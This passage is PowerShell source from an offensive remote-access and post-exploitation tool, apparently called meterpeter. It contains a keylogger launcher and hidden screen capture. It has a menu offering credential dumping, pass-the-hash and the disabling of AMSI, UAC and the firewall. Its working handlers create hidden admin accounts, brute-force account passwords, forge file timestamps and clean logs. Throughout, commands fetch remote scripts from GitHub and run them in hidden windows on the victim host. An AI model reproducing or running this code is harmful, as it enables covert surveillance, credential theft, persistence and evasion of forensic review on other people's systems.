        write-host "   Stop      Stop keylogger Process(s)    Stop record and leak keystrokes";
        write-host "   Return    Return to Server Main Menu" -ForeGroundColor yellow;
        write-host "`n`n :meterpeter:keylogger> " -NoNewline -ForeGroundColor Green;
        $choise = Read-Host;
        If($choise -ieq "Mouse")
        {
        
           ## Random FileName generation
           $Rand = -join (((48..57)+(65..90)+(97..122)) * 80 |Get-Random -Count 6 |%{[char]$_})
           $CaptureFile = "$Env:TMP\MouseCapture-" + "$Rand.zip" ## Capture File Name
           Write-Host " - Time of capture (seconds): " -NoNewline
           $Timmer = Read-Host

           #banner
           Write-Host "`n`n   Capture      Timer     Remote Storage" -ForegroundColor Green
           Write-Host "   -------      ------    --------------"
           Write-Host "   MouseClicks  $Timmer(sec)   $CaptureFile`n"

           If(Test-Path "$Env:WINDIR\System32\psr.exe")
           {
              $Command = "Start-Process -WindowStyle hidden powershell -ArgumentList `"psr.exe`", `"/start`", `"/output $CaptureFile`", `"/sc 1`", `"/maxsc 100`", `"/gui 0;`", `"Start-Sleep -Seconds $Timmer;`", `"psr.exe /stop`" -EA SilentlyContinue|Out-Null"
           }
           Else
           {
              Write-Host "    => error: '$Env:WINDIR\System32\psr.exe' not found .." -ForegroundColor Red -BackgroundColor Black
           }
        }
        If($choise -ieq "Start")
        {
           ## Start recording system keystrokes
           If(-not(Test-Path -Path "$Env:TMP\Keylogger.ps1"))
           {
              ## Make sure keylogger.ps1 exists remote
              $Command = "Start-BitsTransfer -priority foreground -Source https://raw.githubusercontent.com/r00t-3xp10it/redpill/main/bin/Keylogger.ps1 -Destination $Env:TMP\Keylogger.ps1 -ErrorAction SilentlyContinue|Out-Null;powershell -File `"$Env:TMP\Keylogger.ps1`" -Keylogger Start"
           }Else{
              $Command = "powershell -File `"$Env:TMP\Keylogger.ps1`" -Keylogger Start"
           }
        }
        If($choise -ieq "Stop")
        {
           ## Stop recording system keystrokes
           If(-not(Test-Path -Path "$Env:TMP\Keylogger.ps1")){## Make sure keylogger.ps1 exists remote
               $Command = "Start-BitsTransfer -priority foreground -Source https://raw.githubusercontent.com/r00t-3xp10it/redpill/main/bin/Keylogger.ps1 -Destination $Env:TMP\Keylogger.ps1 -ErrorAction SilentlyContinue|Out-Null;powershell -File `"$Env:TMP\Keylogger.ps1`" -Keylogger Stop;Start-sleep -Seconds 2;Remove-Item -Path `"$Env:TMP\Keylogger.ps1`" -Force"
           }Else{
               $Command = "powershell -File `"$Env:TMP\Keylogger.ps1`" -Keylogger Stop;Start-sleep -Seconds 2;Remove-Item -Path `"$Env:TMP\Keylogger.ps1`" -Force"
           }        
        }
       If($choise -ieq "Return" -or $choice -ieq "return" -or $choise -ieq "cls" -or $choise -ieq "Modules" -or $choise -ieq "modules" -or $choise -ieq "clear")
       {
           $Command = $Null; 
       }

    }


    ## Venom v1.0.16 function
    If($Command -ieq "PostExploit" -or $Command -ieq "post")
    {
      ## Post-Exploiation Modules (red-team)
      write-host "`n`n   Modules   Description" -ForegroundColor green;
      write-host "   -------   -----------";
      write-host "   FindEop   Search for _EOP_ entry points";
      write-host "   Escalate  Escalate rev tcp shell privileges";
      write-host "   Persist   Persist rev tcp shell on startup";
      write-host "   Artifacts Clean remote host activity tracks";
      write-host "   HiddenDir Super\hidden directorys manager";
      write-host "   hideUser  Remote hidden accounts manager";
      write-host "   Passwords Search for passwords in txt|logs";
      write-host "   BruteAcc  Brute-force user account password";
      write-host "   PhishCred Promp remote user for logon creds";
      write-host "   Stream    Stream remote host desktop live";
      write-host "   Camera    Take snapshots with remote webcam";
      write-host "   Speak     Make remote host speak one frase";
      write-host "   Msgbox    Spawn remote msgboxs manager";
      write-host "   OpenUrl   Open\spawn URL in default browser";
      write-host "   GoogleX   Browser google easter eggs manager";
      write-host "   TimeStamp Change remote host files timestamp";
      write-host "   Dnspoof   Hijack dns entrys in hosts file";
      write-host "   AMSIset   Turn On/Off AMSI using regedit";
      write-host "   UACSet    Turn On/Off remote UAC in regedit";
      write-host "   ASLRSet   Turn On/Off remote ASLR in regedit";
      write-host "   TaskMan   Turn On/off TaskManager in regedit";
      write-host "   Firewall  Turn On/Off remote firewall in regedit";
      write-host "   NoDrive   Hide Drives from Explorer using regedit";
      write-host "   DumpSAM   Dump LSASS/SAM/SYSTEM raw credentials ";
      write-host "   PtHash    Pass-The-Hash (remote auth)";
      write-host "   LockPC    Lock remote host WorkStation";
      write-host "   Restart   Restart remote host WorkStation";
      write-host "   Return    Return to Server Main Menu" -ForeGroundColor yellow;
      write-host "`n`n :meterpeter:Post> " -NoNewline -ForeGroundColor Green;
      $choise = Read-Host;
      If($choise -ieq "FindEop" -or $choise -ieq "EOP")
      {
        write-host "`n`n   Remark" -ForegroundColor Yellow;
        write-host "   ------";
        write-host "   None of the modules in this sub-category will try to exploit any";
        write-host "   weak permissions found. They will only report the vulnerability.";
        write-host "   Note: Agressive module displays [MITRE::Id] of the vulnerability." -ForegroundColor Yellow;
        write-host "   Note: Use 'Agressive reports' for more elaborated reports (slower)." -ForegroundColor Yellow;
        write-host "`n`n   Modules   Description                       Remark" -ForegroundColor green;
        write-host "   -------   -----------                       -------";
        write-host "   Agressive Search for EOP possible entrys    Client:User  - Privileges Required";
        write-host "   Check     Retrieve directory permissions    Client:User  - Privileges Required";
        write-host "   WeakDir   Search weak permissions recursive Client:User  - Privileges Required";
        write-host "   Service   Search for Unquoted Service Paths Client:User  - Privileges Required";
        write-host "   RottenP   Search For rotten potato vuln     Client:User  - Privileges Required";
        write-host "   RegACL    Insecure Registry Permissions     Client:User  - Privileges Required";
        write-host "   Return    Return to Server Main Menu" -ForeGroundColor yellow;
        write-host "`n`n :meterpeter:Post:Eop> " -NoNewline -ForeGroundColor Green;
        $my_choise = Read-Host;
        If($my_choise -ieq "Agressive")
        {
          write-host " - Use agressive reports? (y|n): " -NoNewline;
          $VerOut = Read-Host;
          Write-Host " * Agressive search for ALL EOP possible entrys." -ForegroundColor Green;Start-Sleep -Seconds 1;
          If($VerOut -iMatch '^(y|yes)$')
          {
             $StdOutVerb = "findeop.bat verbose"
             Write-Host "   => Remark: Module takes aprox 3 minuts to finish .." -ForegroundColor Yellow;write-host "`n`n";
          }
          Else
          {
             $StdOutVerb = "findeop.bat"
             Write-Host "   => Remark: Module takes aprox 4 minuts to finish .." -ForegroundColor Yellow;write-host "`n`n";
          }
          $Command = "iwr -Uri https://raw.githubusercontent.com/r00t-3xp10it/meterpeter/master/mimiRatz/FindEop.bat -OutFile `$Env:TMP\FindEOP.bat;cmd /R %tmp%\$StdOutVerb;Remove-Item -Path `"`$Env:TMP\FindEOP.bat`" -Force"
        }
        If($my_choise -ieq "Check" -or $my_choise -ieq "check")
        {
          write-host " - Input Remote Folder Path (`$Env:TMP): " -NoNewline;
          $RfPath = Read-Host;

          write-host " * List Remote-Host Folder Permissions (icacls)." -ForegroundColor Green
          If(-not($RfPath)){$RfPath = "$env:tmp"};write-host "`n`n";
          $Command = "icacls `"$RfPath`" `> dellog.txt;Get-Content dellog.txt;remove-item dellog.txt -Force";
        }
        If($my_choise -ieq "WeakDir" -or $my_choise -ieq "Dir")
        {
          write-host " - Sellect User\Group (Everyone:|BUILTIN\Users:): " -NoNewline;
          $User_Attr = Read-Host;
          write-host " - Sellect Attribute to Search (F|M|C): " -NoNewline;
          $Attrib = Read-Host;
          write-host " - Input Remote Folder Path (`$env:tmp): " -NoNewline;
          $RfPath = Read-Host;
          If(-not ($Attrib) -or $Attrib -eq " "){$Attrib = "F"};
          If(-not ($RfPath) -or $RfPath -eq " "){$RfPath = "$env:programfiles"};
          If(-not ($User_Attr) -or $User_Attr -eq " "){$User_Attr = "Everyone:"};
          write-host " * List Folder(s) Weak Permissions Recursive." -ForegroundColor Green;
          $Command = "icacls `"$RfPath\*`" `> `$env:tmp\WeakDirs.txt;`$check_ACL = get-content `$env:tmp\WeakDirs.txt|findstr /I /C:`"$User_Attr`"|findstr /I /C:`"($Attrib)`";If(`$check_ACL){Get-Content `$env:tmp\WeakDirs.txt;remove-item `$env:tmp\WeakDirs.txt -Force}else{echo `"   [i] None Weak Folders Permissions Found [ $User_Attr($Attrib) ] ..`" `> `$env:tmp\Weak.txt;Get-Content `$env:tmp\Weak.txt;Remove-Item `$env:tmp\Weak.txt -Force;remove-item `$env:tmp\WeakDirs.txt -Force}";
       }
        If($my_choise -ieq "Service" -or $my_choise -ieq "service")
        {
          write-host " * List Remote-Host Unquoted Service Paths." -ForegroundColor Green;
          $Command = "gwmi -class Win32_Service -Property Name, DisplayName, PathName, StartMode | Where {`$_.StartMode -eq `"Auto`" -and `$_.PathName -notlike `"C:\Windows*`" -and `$_.PathName -notlike '`"*`"'} | select PathName,DisplayName,Name `> WeakFP.txt;Get-Content WeakFP.txt;remove-item WeakFP.txt -Force";
        }
        If($my_choise -ieq "RottenP" -or $my_choise -ieq "rotten")
        {
          write-host " * Search for Rotten Potato Vulnerability." -ForegroundColor Green;write-host "`n`n";
          $Command = "`$bool = (([System.Security.Principal.WindowsIdentity]::GetCurrent()).groups -match `"S-1-5-32-544`");If(`$bool){echo `"   [i] Client:Admin Detected, this module cant run with admin Privileges`" `> dellog.txt;Get-Content dellog.txt;Remove-Item dellog.txt -Force}else{cmd /R whoami /priv|findstr /i /C:`"SeImpersonatePrivilege`" /C:`"SeAssignPrimaryPrivilege`" /C:`"SeTcbPrivilege`" /C:`"SeBackupPrivilege`" /C:`"SeRestorePrivilege`" /C:`"SeCreateTokenPrivilege`" /C:`"SeLoadDriverPrivilege`" /C:`"SeTakeOwnershipPrivilege`" /C:`"SeDebugPrivileges`" `> dellog.txt;`$check_ACL = get-content dellog.txt|findstr /i /C:`"Enabled`";If(`$check_ACL){echo `"[i] Rotten Potato Vulnerable Settings Found [Enabled] ..`" `> test.txt;Get-Content test.txt;Remove-Item test.txt -Force;Get-Content dellog.txt;remove-item dellog.txt -Force}else{echo `"   [i] None Weak Permissions Found [ Rotten Potato ] ..`" `> test.txt;Get-Content test.txt;Remove-Item test.txt -Force;Remove-Item dellog.txt -Force}}";
       }
        If($my_choise -ieq "RegACL" -or $my_choise -ieq "acl")
        {
          write-host " - Sellect User\Group (NT AUTHORITY\SYSTEM|BUILTIN\Users): " -NoNewline;
          $Group_Attr = Read-Host;

          write-host " * List Remote-Host Weak Services registry permissions." -ForegroundColor Green;
          If(-not ($Group_Attr) -or $Group_Attr -eq " "){$Group_Attr = "BUILTIN\Users"};write-host "`n";
          $Command = "Get-acl HKLM:\System\CurrentControlSet\services\*|Select-Object PSChildName,Owner,AccessToString,Path|Where-Object{`$_.Owner -contains `"$Group_Attr`"}|format-list|Out-File -FilePath `$env:tmp\acl.txt -Force;((Get-Content -Path `$env:tmp\acl.txt -Raw) -Replace `"CREATOR OWNER Allow  268435456`",`"`")|Set-Content -Path `$env:tmp\acl.txt -Force;Get-Content `$env:tmp\acl.txt|select-string PSChildName,Owner,FullControl,Path|Out-File -FilePath `$env:tmp\acl2.txt -Force;`$Chk = Get-Content `$env:tmp\acl2.txt|findstr `"FullControl`";If(-not (`$Chk)){echo `"   [i] None Vulnerable Service(s) Found that [ allow FullControl ] ..`" `> `$env:tmp\dellog.txt;Get-Content `$env:tmp\dellog.txt;Remove-Item `$env:tmp\dellog.txt -Force;Remove-Item `$env:tmp\acl.txt -Force;Remove-Item `$env:tmp\acl2.txt -Force}else{Get-Content `$env:tmp\acl2.txt;Remove-Item `$env:tmp\acl.txt -Force;Remove-Item `$env:tmp\acl2.txt -Force}";
        }
        If($my_choise -ieq "Return" -or $my_choise -ieq "return" -or $my_choise -ieq "cls" -or $my_choise -ieq "Modules" -or $my_choise -ieq "modules" -or $my_choise -ieq "clear")
        {
          $RfPath = $Null;
          $Command = $Null;
          $my_choise = $Null;
          $Group_Attr = $Null;
        }
      }
      If($choise -ieq "HiddenDir" -or $choise -ieq "Hidden")
      {
         write-host "`n`n   Description" -ForegroundColor Yellow
         write-host "   -----------"
         write-host "   This cmdlet allow users to Query\Create\Delete super hidden folders."
         write-host "   Super hidden folders contains 'hidden, system' attributes set and does"
         write-host "   not show-up in explorer (gui) even if 'show hidden files' its activated."
         Write-Host "   Remark: Leave the input fields blank to random search for directorys." -ForegroundColor Yellow
         write-host "`n`n   Modules  Description                  Remark" -ForegroundColor green;
         write-host "   -------  -----------                  ------";
         write-host "   Search   for regular hidden folders   Client:User  - Privileges Required";
         write-host "   Super    Search super hidden folders  Client:User  - Privileges Required";
         write-host "   Create   Create\Modify super hidden   Client:User  - Privileges Required";
         write-host "   Delete   One super hidden folder      Client:User  - Privileges Required";
         write-host "   Return   Return to Server Main Menu" -ForeGroundColor yellow
         write-host "`n`n :meterpeter:Post:Hidden> " -NoNewline -ForeGroundColor Green;
         $Vault_choise = Read-Host;
         If($Vault_choise -ieq "Search")
         {
            $FolderName = Read-Host " - Folder name to search ";
            If(-not($FolderName) -or $FolderName -ieq $null)
            {
               $FolderName = "false"
               Write-Host "   => Error: wrong FolderName, set demo to 'false' .." -ForegroundColor Red
            }

            $Directory = Read-Host " - The directory to scan ";
            If(-not($Directory) -or $Directory -ieq $null)
            {
               $Directory = "false"
               $Recursive = "false"
               Write-Host "   => Error: wrong Directory, set demo to 'CommonLocations' .." -ForegroundColor Red
            }
            Else
            {
               $Recursive = Read-Host " - Recursive search (y|n)";
               If($Recursive -iMatch '^(y|yes)$')
               {
                  $Recursive = "True"
               }
               Else
               {
                  $Recursive = "false"
               }
            }

            Write-Host " * Query for regular hidden folders!" -ForegroundColor Green;write-host ""
            $Command = "iwr -Uri `"https://raw.githubusercontent.com/r00t-3xp10it/meterpeter/master/mimiRatz/SuperHidden.ps1`" -OutFile `"`$Env:TMP\SuperHidden.ps1`"|Out-Null;powershell -WindowStyle hidden -File `$Env:TMP\SuperHidden.ps1 -Action Query -Directory `"$Directory`" -FolderName `"$FolderName`" -Recursive `"$Recursive`" -Attributes `"Hidden`";Remove-Item -Path `$Env:TMP\SuperHidden.ps1 -Force"
         }
         If($Vault_choise -ieq "Super")
         {
            $FolderName = Read-Host " - Folder name to search ";
            If(-not($FolderName) -or $FolderName -ieq $null)
            {
               $FolderName = "false"
               Write-Host "   => Error: wrong FolderName, set demo to 'false' .." -ForegroundColor Red
            }

            $Directory = Read-Host " - The directory to scan ";
            If(-not($Directory) -or $Directory -ieq $null)
            {
               $Directory = "false"
               $Recursive = "false"
               Write-Host "   => Error: wrong DirectoryInput, set demo to 'CommonLocations' .." -ForegroundColor Red
            }
            Else
            {
               $Recursive = Read-Host " - Recursive search (y|n)";
               If($Recursive -iMatch '^(y|yes)$')
               {
                  $Recursive = "True"
               }
               Else
               {
                  $Recursive = "false"
               }
            }

            Write-Host " * Query for super hidden folders" -ForegroundColor Green;write-host ""
            $Command = "iwr -Uri `"https://raw.githubusercontent.com/r00t-3xp10it/meterpeter/master/mimiRatz/SuperHidden.ps1`" -OutFile `"`$Env:TMP\SuperHidden.ps1`"|Out-Null;powershell -WindowStyle hidden -File `$Env:TMP\SuperHidden.ps1 -Action Query -Directory `"$Directory`" -FolderName `"$FolderName`" -Recursive `"$Recursive`";Remove-Item -Path `$Env:TMP\SuperHidden.ps1 -Force"
         }
         If($Vault_choise -ieq "Create")
         {
            $Action = Read-Host " - Create Hidden or Visible dir";
            $FolderName = Read-Host " - Folder name to Create\Modify";
            $Directory = Read-Host " - The storage directory to use";
            If(-not($Action) -or $Action -ieq $null){$Action = "hidden"}
            If(-not($FolderName) -or $FolderName -ieq $null){$FolderName = "vault"}
            If(-not($Directory) -or $Directory -ieq $null){$Directory = "`$Env:TMP"}
            Write-Host " * Create\Modify super hidden folders" -ForegroundColor Green
            $Command = "iwr -Uri `"https://raw.githubusercontent.com/r00t-3xp10it/meterpeter/master/mimiRatz/SuperHidden.ps1`" -OutFile `"`$Env:TMP\SuperHidden.ps1`"|Out-Null;powershell -WindowStyle hidden -File `$Env:TMP\SuperHidden.ps1 -Action $Action -Directory `"$Directory`" -FolderName `"$FolderName`";Remove-Item -Path `$Env:TMP\SuperHidden.ps1 -Force"
         }
         If($Vault_choise -ieq "Delete")
         {
            $FolderName = Read-Host " - Folder name to delete";
            $Directory = Read-Host " - The storage directory";write-host ""
            If(-not($FolderName) -or $FolderName -ieq $null){$FolderName = "vault"}
            If(-not($Directory) -or $Directory -ieq $null){$Directory = "`$Env:TMP"}
            Write-Host " * Delete super hidden folders" -ForegroundColor Green
            $Command = "iwr -Uri `"https://raw.githubusercontent.com/r00t-3xp10it/meterpeter/master/mimiRatz/SuperHidden.ps1`" -OutFile `"`$Env:TMP\SuperHidden.ps1`"|Out-Null;powershell -WindowStyle hidden -File `$Env:TMP\SuperHidden.ps1 -Action Delete -Directory `"$Directory`" -FolderName `"$FolderName`";Remove-Item -Path `$Env:TMP\SuperHidden.ps1 -Force"
         }
         If($Vault_choise -ieq "Return" -or $Vault_choise -ieq "cls" -or $Vault_choise -ieq "modules" -or $Vault_choise -ieq "clear")
         {
            $choise = $Null;
            $Command = $Null;
            $Vault_choise = $Null;
         }      
      }
      If($choise -ieq "BruteAcc" -or $choise -ieq "Brute")
      {
         write-host "`n`n   Description" -ForegroundColor Yellow
         write-host "   -----------"
         write-host "   Brute force user account password using dicionary attack."
         write-host "   Remark: Default dicionary contains 59189 password entrys." -ForegroundColor Yellow
         write-host "   Remark: If you wish to use your own dicionary, then store" -ForegroundColor Yellow
         write-host "   it on target %TMP% directory under the name passwords.txt" -ForegroundColor Yellow
         write-host "`n`n   Modules  Description                  Remark" -ForegroundColor green;
         write-host "   -------  -----------                  ------";
         write-host "   Start    Brute force user account     Client:User  - Privileges Required";
         write-host "   Return   Return to Server Main Menu" -ForeGroundColor yellow
         write-host "`n`n :meterpeter:Post:Brute> " -NoNewline -ForeGroundColor Green;
         $Brute_choise = Read-Host;
         If($Brute_choise -ieq "Start")
         {
            $UserAccountName = Read-Host " - Input Account Name";
            Write-Host " * Brute forcing user account [dicionary attack]" -ForegroundColor Green
            If(-not($UserAccountName) -or $UserAccountName -eq $null){$UserAccountName = "`$Env:USERNAME"}

            Write-Host ""
            #Build output DataTable!
            $BruteTime = Get-Date -Format "HH:mm:ss"
            $BruteTable = New-Object System.Data.DataTable
            $BruteTable.Columns.Add("UserName")|Out-Null
            $BruteTable.Columns.Add("StartTime")|Out-Null
            $BruteTable.Columns.Add("Dicionary")|Out-Null

            #Adding values to output DataTable!
            $BruteTable.Rows.Add("$UserAccountName","$BruteTime","`$Env:TMP\passwords.txt")|Out-Null

            #Diplay output DataTable!
            $BruteTable | Format-Table -AutoSize | Out-String -Stream | ForEach-Object {
               $stringformat = If($_ -Match '^(UserName)'){
                  @{ 'ForegroundColor' = 'Green' } }Else{ @{} }
               Write-Host @stringformat $_
            }

            #Run command
            $Command = "iwr -Uri `"https://raw.githubusercontent.com/r00t-3xp10it/redpill/main/modules/CredsPhish.ps1`" -OutFile `"`$Env:TMP\CredsPhish.ps1`"|Out-Null;powershell -WindowStyle hidden -File `$Env:TMP\CredsPhish.ps1 -PhishCreds Brute -Dicionary `$Env:TMP\passwords.txt -UserAccount $UserAccountName;Remove-Item -Path `$Env:TMP\CredsPhish.ps1 -Force"
         }
         If($Brute_choise -ieq "Return" -or $Brute_choise -ieq "cls" -or $Brute_choise -ieq "modules" -or $Brute_choise -ieq "clear")
         {
            $choise = $Null;
            $Command = $Null;
            $Brute_choise = $Null;
         }
      }
      If($choise -ieq "OpenUrl" -or $choise -ieq "URL")
      {
         write-host "`n`n   Description" -ForegroundColor Yellow
         write-host "   -----------"
         write-host "   This module allow users to open one url link on default webbrowser."
         write-host "   It will open the browser or a new tab if the browser its allready up."
         write-host "`n`n   Modules  Description                  Remark" -ForegroundColor green;
         write-host "   -------  -----------                  ------";
         write-host "   Open     Url on default browser       Client:User  - Privileges Required";
         write-host "   Return   Return to Server Main Menu" -ForeGroundColor yellow
         write-host "`n`n :meterpeter:Post:Url> " -NoNewline -ForeGroundColor Green;
         $url_choise = Read-Host;
         If($url_choise -ieq "Open")
         {
            $UrlLink = Read-Host " - Input URL to open";Write-Host "`n"
            $Command = "Start-Process -WindowStyle Maximized `"$UrlLink`"|Out-Null;If(`$? -eq `"True`"){echo `"   [i] Successfuly open URL: $UrlLink`"|Out-File defbrowser.meterpeter;Start-Sleep -Seconds 1;Get-Content -Path defbrowser.meterpeter;Remove-Item -Path defbrowser.meterpeter -Force}Else{echo `"   [X] Fail to open URL: $UrlLink`"|Out-File defbrowser.meterpeter;Get-Content -Path defbrowser.meterpeter;Remove-Item -Path defbrowser.meterpeter -Force}" 
            $UrlLink = $null
         }
         If($url_choise -ieq "Return" -or $url_choise -ieq "cls" -or $url_choise -ieq "modules" -or $url_choise -ieq "clear")
         {
            $choise = $Null;
            $Command = $Null;
            $url_choise = $Null;
         }
      }
      If($choise -ieq "HideUser")
      {
         write-host "`n`n   Description" -ForegroundColor Yellow
         write-host "   -----------"
         write-host "   This module query, create or delete windows hidden accounts."
         write-host "   It also allow to set the account 'Visible' or 'Hidden' state."
         write-host "   Warning: Create account requires 'LanmanWorkstation' service running" -ForegroundColor Yellow
         write-host "   or else the account created will not inherit admin privileges token." -ForegroundColor Yellow
         write-host "   Manual check: :meterpeter> Get-Service LanmanWorkstation" -ForegroundColor Blue
         write-host "`n`n   Modules  Description                  Remark" -ForegroundColor green;
         write-host "   -------  -----------                  ------";
         write-host "   Query    Query all accounts           Client:User  - Privileges Required";
         write-host "   Create   Create hidden account        Client:Admin - Privileges Required";
         write-host "   Delete   Delete hidden account        Client:Admin - Privileges Required";
         write-host "   Return   Return to Server Main Menu" -ForeGroundColor yellow
         write-host "`n`n :meterpeter:Post:HideUser> " -NoNewline -ForeGroundColor Green;
         $AccManager_choise = Read-Host;
         If($AccManager_choise -ieq "Query")
         {
            Write-Host " * Query all user accounts" -ForegroundColor Green
            $Command = "iwr -Uri `"https://raw.githubusercontent.com/r00t-3xp10it/redpill/main/bin/HiddenUser.ps1`" -OutFile `"`$Env:TMP\HiddenUser.ps1`"|Out-Null;powershell -WindowStyle hidden -File `$Env:TMP\HiddenUser.ps1 -Action Query;Remove-Item -Path `$Env:TMP\HiddenUser.ps1 -Force"
         }
         If($AccManager_choise -ieq "Create")
         {
            $AccountName = Read-Host " - Input account name"
            $password = Read-Host " - Input account pass"
            $AccountState = Read-Host " - Account State (hidden|visible)"
            Write-Host " * Create new user account" -ForegroundColor Green
            If(-not($AccountState) -or $AccountState -ieq $null){$AccountState = "hidden"}Else{$AccountState = "visible"}
            $Command = "`$bool = (([System.Security.Principal.WindowsIdentity]::GetCurrent()).groups -match `"S-1-5-32-544`");If(`$bool){iwr -Uri `"https://raw.githubusercontent.com/r00t-3xp10it/redpill/main/bin/HiddenUser.ps1`" -OutFile `"`$Env:TMP\HiddenUser.ps1`"|Out-Null;powershell -WindowStyle hidden -File `$Env:TMP\HiddenUser.ps1 -Action Create -UserName $AccountName -Password $password -State $AccountState;Remove-Item -Path `$Env:TMP\HiddenUser.ps1 -Force}Else{echo `"    => error: Administrator privileges required!`"|Out-File `$Env:TMP\hidenUser.meterpeter;Get-Content -Path `$Env:TMP\hidenUser.meterpeter;Remove-Item -Path `$Env:TMP\hidenUser.meterpeter -Force}"
         }
         If($AccManager_choise -ieq "Delete")
         {
            Write-Host " - Input account name: " -NoNewline -ForegroundColor Red;
            $AccountName = Read-Host;Write-Host " * Delete '$AccountName' user account" -ForegroundColor Green
            $Command = "`$bool = (([System.Security.Principal.WindowsIdentity]::GetCurrent()).groups -match `"S-1-5-32-544`");If(`$bool){iwr -Uri `"https://raw.githubusercontent.com/r00t-3xp10it/redpill/main/bin/HiddenUser.ps1`" -OutFile `"`$Env:TMP\HiddenUser.ps1`"|Out-Null;powershell -WindowStyle hidden -File `$Env:TMP\HiddenUser.ps1 -Action Delete -UserName $AccountName;Remove-Item -Path `$Env:TMP\HiddenUser.ps1 -Force}Else{echo `"    => error: Administrator privileges required!`"|Out-File `$Env:TMP\hidenUser.meterpeter;Get-Content -Path `$Env:TMP\hidenUser.meterpeter;Remove-Item -Path `$Env:TMP\hidenUser.meterpeter -Force}"
         }
         If($AccManager_choise -ieq "Return" -or $AccManager_choise -ieq "cls" -or $AccManager_choise -ieq "modules" -or $AccManager_choise -ieq "clear")
         {
            $choise = $Null;
            $Command = $Null;
            $AccManager_choise = $Null;
         }
      }
      If($choise -ieq "msgbox")
      {
         write-host "`n`n   Description" -ForegroundColor Yellow
         write-host "   -----------"
         write-host "   This module allow attacker to spawn a simple msgbox that auto-closes"
         write-host "   after a certain amount of pre-selected time, or spawn a msgbox that"
         write-host "   waits for comfirmation (press yes button on msgbox) to execute cmdline"
         write-host "`n`n   Modules  Description                  Remark" -ForegroundColor green;
         write-host "   -------  -----------                  ------";
         write-host "   simple   Spawn simple msgbox          Client:User  - Privileges Required";
         write-host "   cmdline  msgbox that exec cmdline     Client:User  - Privileges Required";
         write-host "   Return   Return to Server Main Menu" -ForeGroundColor yellow
         write-host "`n`n :meterpeter:Post:Msgbox> " -NoNewline -ForeGroundColor Green;
         $msgbox_choise = Read-Host;
         If($msgbox_choise -ieq "Simple")
         {
            $MsgBoxClose = Read-Host " - Msgbox auto-close time"
            $MsgBoxTitle = Read-Host " - Input the msgbox title"
            $MsgBoxText = Read-Host " - Input text to display "
            Write-Host " * Spawn simple remote msgbox" -ForegroundColor Green
            $Command = "powershell (New-Object -ComObject Wscript.Shell).Popup(`"$MsgBoxText`",$MsgBoxClose,`"$MsgBoxTitle`",4+64)|Out-Null"
         }
         If($msgbox_choise -ieq "cmdline")
         {
            $MsgBoxClose = Read-Host " - Msgbox auto-close time"
            $MsgBoxTitle = Read-Host " - Input the msgbox title"
            $MsgBoxText = Read-Host " - Input text to display "
            $MsgBoxAppli = Read-Host " - PS Cmdline to execute "
            Write-Host " * Spawn msgbox that exec cmdline" -ForegroundColor Green
            $Command = "[int]`$MymsgBox = powershell (New-Object -ComObject Wscript.Shell).Popup(`"$MsgBoxText`",$MsgBoxClose,`"$MsgBoxTitle`",4+64);If(`$MymsgBox -eq 6){echo `"$MsgBoxAppli`"|Invoke-Expression;echo `"`n   [`$MymsgBox] Command '$MsgBoxAppli' executed.`"|Out-File msglogfile.log}Else{echo `"`n   [`$MymsgBox] Failed to execute '$MsgBoxAppli' command.`"|Out-File msglogfile.log};Get-Content -Path msglogfile.log;Remove-Item -Path msglogfile.log -Force"
         }
         If($msgbox_choise -ieq "Return" -or $msgbox_choise -ieq "cls" -or $msgbox_choise -ieq "modules" -or $msgbox_choise -ieq "clear")
         {
            $choise = $Null;
            $Command = $Null;
            $msgbox_choise = $Null;
         }
      }
      If($choise -ieq "TimeStamp" -or $choise -ieq "mace")
      {
         write-host "`n`n   Description" -ForegroundColor Yellow
         write-host "   -----------"
         write-host "   This module modify sellected file mace propertys:"
         write-host "   CreationTime, LastAccessTime and LastWriteTime .."
         write-host "`n`n   Modules  Description                  Remark" -ForegroundColor green;
         write-host "   -------  -----------                  ------";
         write-host "   Modify   existing file timestamp      Client:User  - Privileges Required";
         write-host "   Return   Return to Server Main Menu" -ForeGroundColor yellow
         write-host "`n`n :meterpeter:Post:Mace> " -NoNewline -ForeGroundColor Green;
         $timestamp_choise = Read-Host;
         If($timestamp_choise -ieq "Modify")
         {
            Write-Host " - The file to modify absolucte path: " -NoNewline
            $FileMace = Read-Host
            Write-Host " - The Date (08 March 1999 19:19:19): " -NoNewline
            $DateMace = Read-Host
            Write-Host " * Modify sellected file timestamp" -ForegroundColor Green
            $Command = "iwr -Uri `"https://raw.githubusercontent.com/r00t-3xp10it/redpill/main/bin/FileMace.ps1`" -OutFile `"`$Env:TMP\FileMace.ps1`"|Out-NUll;powershell -WindowStyle hidden -file `$Env:TMP\FileMace.ps1 -FileMace $FileMace -Date `"$DateMace`";Start-Sleep -Seconds 4;Remove-Item -Path `"`$Env:TMP\FileMace.ps1`" -Force"
         }
         If($timestamp_choise -ieq "Return" -or $timestamp_choise -ieq "cls" -or $timestamp_choise -ieq "modules" -or $timestamp_choise -ieq "clear")
         {
            $choise = $Null;
            $Command = $Null;
            $timestamp_choise = $Null;
         }
      }
      If($choise -ieq "Artifacts")
      {
         write-host "`n`n   Description" -ForegroundColor Yellow
         write-host "   -----------"
         write-host "   This module deletes attacker activity (artifacts) on target system by"
         write-host "   deleting .tmp, .log, .ps1 from %tmp% and eventvwr logfiles from snapin"
         write-host "   Remark: Administrator privs required to clean eventvwr + Restore Points" -ForegroundColor Yellow
         write-host "`n`n   Modules  Description                  Remark" -ForegroundColor green;
         write-host "   -------  -----------                  ------";
         write-host "   Query    query eventvwr logs          Client:User  - Privileges Required"
         write-host "   Clean    clean system tracks          Client:User\Admin - Privs Required";
         write-host "   Paranoid clean tracks paranoid        Client:User\Admin - Privs Required";
         write-host "   Return   Return to Server Main Menu" -ForeGroundColor yellow
         write-host "`n`n :meterpeter:Post:Artifacts> " -NoNewline -ForeGroundColor Green;
         $track_choise = Read-Host;
         If($track_choise -ieq "Query")
         {
            Write-Host " * query main eventvwr logs" -ForegroundColor Green;Write-Host "`n"
            $Command = "Get-WinEvent -ListLog * -ErrorAction Ignore|Where-Object { `$_.LogName -iMatch '(AMSI|UAC|`^Application`$|DeviceGuard/Operational`$|Regsvr32/Operational`$|Windows Defender|WMI-Activity/Operational`$|AppLocker/Exe and DLL`$|AppLocker/MSI and Script`$|`^windows powershell`$|`^Microsoft-Windows-PowerShell/Operational`$|Bits-Client/Operational`$|TCPIP)' -and `$_.LogName -iNotMatch '(/Admin)$'}|Format-Table -AutoSize `> Event.txt;Get-content Event.txt;Remove-Item Event.txt -Force";
         }
         If($track_choise -ieq "clean")
         {
            Write-Host " * Cleanning system tracks" -ForegroundColor Green;
